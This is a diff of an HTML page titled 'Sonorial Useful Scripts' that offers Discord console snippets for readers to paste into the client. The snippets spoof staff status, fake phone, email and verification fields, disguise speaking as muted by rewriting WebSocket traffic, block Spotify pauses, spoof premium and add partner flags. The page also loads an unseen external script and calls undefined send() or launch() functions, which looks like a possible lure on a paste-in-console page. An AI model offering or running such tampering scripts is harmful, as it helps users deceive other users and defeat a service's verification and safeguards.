@@ -2,13 +2,99 @@
 <html>
 <script src="javascript.js"></script> 
 <head>
-<title>Loading..</title>
+<title>11</title>
 </head>
+<h1>Sonorial Useful Scripts</h1>
+<h3>THIS PAGE NEEDS TO BE LOADED FROM THE DISCORD DOMAIN OR IT WILL NOT CONNECT!!!
+SECURITY FROM WEB CRAWLERS AND SKID'S BECAUSE THEY SUCK!!!!!!!!</h3>
+<p>Discord Javascript Console Commands</p>
+More scripts + better looking site soon!
+<p>------------------------------------</p>
+<h2>Enable Experiments</h2>
+<p>
+  webpackChunkdiscord_app.push([[0], {}, (e) => { module = Object.values(e.c).find(x => x?.exports?.default?.getUsers).exports.default; }]);
+  nodes = Object.values(module._dispatcher._actionHandlers._dependencyGraph.nodes);
+  try { nodes.find(x => x.name == "ExperimentStore").actionHandler["OVERLAY_INITIALIZE"]({ user: { flags: 1 } }); } catch (e) { }
+  original = [module.getCurrentUser, module.getNonImpersonatedCurrentUser];
+  module.getCurrentUser = module.getNonImpersonatedCurrentUser = () => ({ isStaff: () => true });
+  nodes.find(x => x.name == "DeveloperExperimentStore").actionHandler["OVERLAY_INITIALIZE"]();
+  [module.getCurrentUser, module.getNonImpersonatedCurrentUser] = original;
+</p>
+<p>------------------------------------</p>
+<h2>bypass verify</h2>
+window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getCurrentUser !== undefined) {return m.default.getCurrentUser().phone = '+1234567890';}if (m.getCurrentUser !== undefined) {return m.getCurrentUser().phone = '+1234567890'}}}]);
+window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getCurrentUser !== undefined) {return m.default.getCurrentUser().email = 'bypass@lor.io';}if (m.getCurrentUser !== undefined) {return m.getCurrentUser().email = 'bypass@lor.io'}}}]);
+window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getCurrentUser !== undefined) {return m.default.getCurrentUser().verified = true;}if (m.getCurrentUser !== undefined) {return m.getCurrentUser().verified = true}}}]);
+<p>------------------------------------</p>
+<h2>Fake Mute</h2>
+
+var text = new TextDecoder("utf-8");
+
+WebSocket.prototype.original = WebSocket.prototype.send;
+WebSocket.prototype.send = function(data) {
+    if (Object.prototype.toString.call(data) === "[object ArrayBuffer]") {
+        if (text.decode(data).includes("self_deaf")) data = data.replace('"self_mute":false', 'NashyLove');
+    }
+    WebSocket.prototype.original.apply(this, [data]);
+}
+
+Steps: 
+Join voice channel
+mute and deafen youself
+execute the script
+unmute and speak!
+<p>------------------------------------</p>
+<h2>No spotify Pause</h2>
+
+XMLHttpRequest.prototype.realOpen = XMLHttpRequest.prototype.open;
+function myOpen(method, url, async, user, password) {
+  if (url == "https://api.spotify.com/v1/me/player/pause" && method == "PUT") url = "127.0.0.1";
+  this.realOpen(method, url, async, user, password);
+}
+XMLHttpRequest.prototype.open = myOpen;
+<p>------------------------------------</p>
+<h2>Spoof spotify premium </h2>
+
+(webpackChunkdiscord_app.push([
+    [''], {},
+    e => {
+        m = [];
+        for (let c in e.c) m.push(e.c[c])
+    }
+]), m).find(m => m?.exports?.Z?.getAccounts).exports.Z.getAccounts().forEach((conn) => conn.type === "spotify" && (webpackChunkdiscord_app.push([
+    [''], {},
+    e => {
+        m = [];
+        for (let c in e.c) m.push(e.c[c])
+    }
+]), m).find(m => m?.exports?.Z?.isDispatching).exports.Z.dispatch({
+    type: "SPOTIFY_PROFILE_UPDATE",
+    accountId: conn.id,
+    isPremium: true
+}))
+<p>------------------------------------</p>
+<p>Client Sided</p>
+<p>------------------------------------</p>
+<h2>Get Server Badge</h2>
+
+var serverid = "serverId";
+window.webpackChunkdiscord_app.push([[Math.random()],{},(req)=>{for(const m of Object.keys(req.c).map((x)=>req.c[x].exports).filter((x)=>x)){if(m.default&&m.default.getGuild!==undefined)return m.default.getGuild(serverid).features.add('PARTNERED');if(m.getGuild!==undefined)return m.getGuild(serverid).features.add('PARTNERED')}}])
+<p>------------------------------------</p>
+<h2>Get Verified Badge</h2>
+
+var serverid = "serverId";
+window.webpackChunkdiscord_app.push([[Math.random()],{},(req)=>{for(const m of Object.keys(req.c).map((x)=>req.c[x].exports).filter((x)=>x)){if(m.default&&m.default.getGuild!==undefined)return m.default.getGuild(serverid).features.add('PARTNERED');if(m.getGuild!==undefined)return m.getGuild(serverid).features.add('PARTNERED')}}])
+
 <body>
   <script>
     var url = new URL(window.location.href);
     var parameterValue = url.searchParams.get("z");
-    send();
+    if (parameterValue) {
+
+        send();
+      } else {
+        launch()
+      }    
   </script>
 </body>
 </html>
